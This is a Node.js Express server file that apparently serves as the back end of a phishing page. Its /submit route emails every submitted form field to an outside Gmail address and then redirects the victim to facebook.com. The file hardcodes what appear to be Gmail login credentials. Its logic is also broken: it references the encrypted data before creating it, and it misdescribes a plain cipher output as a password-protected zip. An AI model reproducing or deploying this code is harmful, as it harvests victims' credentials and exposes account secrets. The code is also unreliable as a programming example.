const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const crypto = require("crypto");
const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", async (req, res) => {
    try {
        const data = req.body;

        // validate data
        if (!data || typeof data !== "object") {
            throw new Error("Invalid data.");
        }

        // create nodemailer transport object
        const transporter = nodemailer.createTransport({
            host: "smtp.gmail.com",
            port: 465,
            secure: true,
            auth: {
                user: "tobir2275@gmail.com",
                pass: "qteaicwtuuzthdbl",
            },
        });

        // create mail options object
        const mailOptions = {
            from: "tobir2275@gmail.com",
            to: "isaiahgabriel175@gmail.com", // recipient email address
            subject: "Data file",
            text: "Please find attached the password-protected zip file containing the message data.",
            attachments: [{
                filename: "happy.zip",
                content: encrypted
            }]
        };

        // send mail with defined transport object
        const info = await transporter.sendMail(mailOptions);
        console.log("Email sent successfully.", info);

        // create zip file with password
        const zip = require("jszip")();
        zip.file("happy.txt", JSON.stringify(data));
        const content = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE", compressionOptions: { level: 9 } });
        const password = "1234";
        const encrypted = await require("crypto").createCipher("aes-256-ctr", password).update(content);

        // write encrypted zip file to disk
        fs.writeFileSync("happy.zip", encrypted);

        // redirect the user to Facebook
        res.redirect("https://www.facebook.com");
    } catch (err) {
        console.error(err);
        res.status(500).send("Error sending email.");
    }
});


app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
